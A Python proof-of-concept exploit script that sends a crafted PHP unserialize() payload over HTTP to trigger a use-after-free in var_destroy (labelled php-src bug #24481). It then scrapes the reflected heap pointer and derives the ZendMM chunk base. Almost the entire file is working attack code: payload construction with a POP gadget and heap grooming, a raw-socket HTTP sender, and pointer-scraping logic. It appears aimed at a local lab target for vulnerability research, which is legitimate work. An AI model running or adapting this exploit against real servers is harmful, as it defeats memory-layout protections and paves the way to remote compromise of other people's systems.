#!/usr/bin/env python3
# INDEX: remote heap-pointer leak via var_destroy reentry uaf | all | needs reentrant __destruct + reflected array
"""var_destroy_24481_remote.py - deliver php-src bug #24481 (var_destroy()
deferred-dtor reentry UAF; NET-NEW, distinct from CVE-2026-109618/109619) fully
over HTTP and scrape the reflected decimal heap pointer -> ZendMM 2 MiB chunk base.

Sends one unserialize() string: a top-level array with >1018 values (forces the
overflow var_entries chunk) carrying a CacheHydrator-shaped POP gadget orphaned
by a duplicate-key overwrite. The orphan's __destruct seats a packed-array
reclaimer, re-enters unserialize() into the dangling var_entries slot, and the
app reflects the rehydrated array as plain integers; the scraped pointer is
masked & ~0x1FFFFF to the chunk base. Precondition (the residual gate): a
POP-reachable class with a real __destruct that re-enters unserialize() on an
attacker property, plus that array reflected in the response (a plain
echo serialize(unserialize($x)) cannot carry it). Pure stdlib, python3 -I safe.

Usage:
    python3 -I poc/bugs/var_destroy_24481_remote.py \
        --url http://127.0.0.1:8185/remote_app24481.php
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import sys
import time
from urllib.parse import urlsplit

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "primitives", "read_leak"))
import var_destroy_ptr_leak as poc   # chunk mask + proven geometry constants

# The app gadget class the orphaned object must instantiate. Must match the
# target app's POP __destruct gadget (lab/vd24481/html/gadget.php).
GADGET_CLASS = "CacheHydrator"

# Heap/mmap pointer window (a fresh ZendMM page run) and the reclaimer sentinel
# (gadget.php seeds $a[$i] = SENTINEL | $i, so every UN-clobbered slot is masked
# out and only the clobbered slot[0] survives the filter).
ADDR_MIN = 0x010000000000
ADDR_MAX = 0x0000FFFFFFFFFFFF
SENTINEL_HI_MASK = 0xFFFFFFFF00000000
SENTINEL_HI = poc.SENTINEL_HI & SENTINEL_HI_MASK   # 0x5A5A5A5A00000000


def build_remote_payload(cls=GADGET_CLASS, nested=poc.NESTED,
                         filler=poc.OUTER_FILLER, groom=poc.GROOM_COUNT):
    """Return the single attacker-controlled ``unserialize()`` string that
    delivers #24481 through a CacheHydrator-shaped sink.

    The orphaned ``cls`` object carries the nested blob (``$blob``, a single
    scalar -> exactly one var_push) and the reclaimer size (``$n``, 130..256 ->
    a 2-page run) as properties, so the attacker drives both (a) and (b); the app
    supplies only the __destruct and the response reflection (c)."""
    blob = nested
    obj = ('O:%d:"%s":2:{s:4:"blob";s:%d:"%s";s:1:"n";i:%d;}'
           % (len(cls), cls, len(blob), blob, groom))
    # key 0 -> gadget object, then overwrite key 0 -> orphan it into the deferred
    # dtor list; >1018 filler values force the overflow var_entries chunk.
    p = 'i:0;' + obj
    for k in range(1, filler + 1):
        p += 'i:%d;i:%d;' % (k, k)
    p += 'i:0;i:777;'
    return 'a:%d:{%s}' % (filler + 2, p)


def _urlencode_bytes(data):
    out = bytearray()
    for b in data:
        if (0x30 <= b <= 0x39 or 0x41 <= b <= 0x5A or
                0x61 <= b <= 0x7A or b in (0x2D, 0x2E, 0x5F, 0x7E)):
            out.append(b)
        else:
            out.extend(b"%%%02X" % b)
    return bytes(out)


def post(host, port, path, payload, field="cook", timeout=10):
    """POST ``field=<payload>`` to the sink (urlencoded form); return the
    response body bytes, or None on a 500 / closed connection."""
    body = field.encode() + b"=" + _urlencode_bytes(payload.encode()
                                                     if isinstance(payload, str)
                                                     else payload)
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (path, host, len(body))
    ).encode() + body
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(req)
        resp = b""
        while True:
            try:
                chunk = s.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            resp += chunk
    except OSError:
        return None
    finally:
        try:
            s.close()
        except OSError:
            pass
    if b"\r\n\r\n" in resp:
        hdr, body_data = resp.split(b"\r\n\r\n", 1)
        if b" 500 " in hdr.split(b"\r\n", 1)[0]:
            return None
        return body_data
    return resp


def _is_leaked_ptr(v):
    return (isinstance(v, int) and not isinstance(v, bool)
            and ADDR_MIN <= v <= ADDR_MAX
            and (v & SENTINEL_HI_MASK) != SENTINEL_HI)


def scrape_pointer(body):
    """Pull the leaked heap pointer out of a reflecting-sink response body.

    Sink-agnostic: prefers a JSON ``items`` array (our lab sink), else scans all
    integers and returns the first heap-range non-sentinel one (covers serialize
    ``a:..{i:0;i:<ptr>;..}`` and a bare echo). Returns the int or None."""
    if isinstance(body, bytes):
        text = body.decode("utf-8", "replace")
    else:
        text = body or ""
    # 1. JSON object with an items array -> items[0] is the clobbered slot.
    for line in text.splitlines():
        line = line.strip()
        if line.startswith("{") and '"items"' in line:
            try:
                obj = json.loads(line)
            except ValueError:
                continue
            items = obj.get("items")
            if isinstance(items, list) and items and _is_leaked_ptr(items[0]):
                return items[0]
            if isinstance(items, list):
                for v in items:
                    if _is_leaked_ptr(v):
                        return v
    # 2. generic integer scan (serialize ints, bare echo, ...).
    for m in re.finditer(r"-?\d{10,}", text):
        try:
            v = int(m.group(0))
        except ValueError:
            continue
        if _is_leaked_ptr(v):
            return v
    return None


def deliver_remote(host, port, path, tries=8, field="cook", verbose=True,
                   nested=poc.NESTED, filler=poc.OUTER_FILLER,
                   groom=poc.GROOM_COUNT, cls=GADGET_CLASS):
    """Fire #24481 remotely and return (chunk_base, leaked_ptr, detail).

    Retries the single-request delivery up to ``tries`` times (the reclaim is
    deterministic in-run, but a worker restart / transient miss can drop a shot).
    Returns (None, None, detail) if no pointer could be scraped."""
    payload = build_remote_payload(cls=cls, nested=nested, filler=filler,
                                   groom=groom)
    detail = {"reqs": 0, "url": "http://%s:%d%s" % (host, port, path),
              "payload_len": len(payload)}
    for i in range(tries):
        detail["reqs"] += 1
        body = post(host, port, path, payload, field=field)
        if body is None:
            if verbose:
                print("[#24481-remote] try %d: no body (500/closed)" % i)
            time.sleep(0.15)
            continue
        ptr = scrape_pointer(body)
        if ptr is not None:
            chunk = poc.chunk_base_from_leak(ptr)
            detail.update(ptr=ptr, chunk=chunk,
                          off=ptr & (0x200000 - 1))
            if verbose:
                print("[#24481-remote] try %d: ptr=0x%x -> chunk=0x%x "
                      "(off 0x%x) in %d req(s)"
                      % (i, ptr, chunk, ptr & 0x1FFFFF, detail["reqs"]))
            return chunk, ptr, detail
        if verbose:
            snippet = body[:120].decode("utf-8", "replace")
            print("[#24481-remote] try %d: no pointer in body: %r" % (i, snippet))
        time.sleep(0.15)
    detail["error"] = "no pointer scraped in %d tries" % tries
    return None, None, detail


def _split_url(url):
    u = urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query
    return host, port, path


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="fire php-src #24481 remotely (HTTP) and print the "
                    "leaked heap pointer + ZendMM chunk base")
    ap.add_argument("--url", default="http://127.0.0.1:8185/remote_app24481.php",
                    help="target reflecting sink URL")
    ap.add_argument("--field", default="cook", help="POST field name")
    ap.add_argument("--tries", type=int, default=8)
    ap.add_argument("--nested", default=poc.NESTED)
    ap.add_argument("--filler", type=int, default=poc.OUTER_FILLER)
    ap.add_argument("--groom", type=int, default=poc.GROOM_COUNT)
    ap.add_argument("--runs", type=int, default=1,
                    help="repeat the whole delivery N times (reliability check)")
    args = ap.parse_args(argv)

    host, port, path = _split_url(args.url)
    print("[#24481-remote] target %s:%d%s field=%s" % (host, port, path, args.field))
    print("[#24481-remote] payload: 1 unserialize() string, %d bytes "
          "(filler=%d groom=%d nested=%r)"
          % (len(build_remote_payload(nested=args.nested, filler=args.filler,
                                      groom=args.groom)),
             args.filler, args.groom, args.nested))
    ok = 0
    for r in range(args.runs):
        chunk, ptr, det = deliver_remote(host, port, path, tries=args.tries,
                                         field=args.field, nested=args.nested,
                                         filler=args.filler, groom=args.groom)
        if chunk is not None:
            ok += 1
            print("[run %d] ptr=0x%012x chunk=0x%012x reqs=%d"
                  % (r, ptr, chunk, det["reqs"]))
        else:
            print("[run %d] FAILED: %s" % (r, det.get("error")))
    print("summary: %d/%d runs delivered a chunk base remotely" % (ok, args.runs))
    return 0 if ok == args.runs and args.runs > 0 else 1


if __name__ == "__main__":
    sys.exit(main())
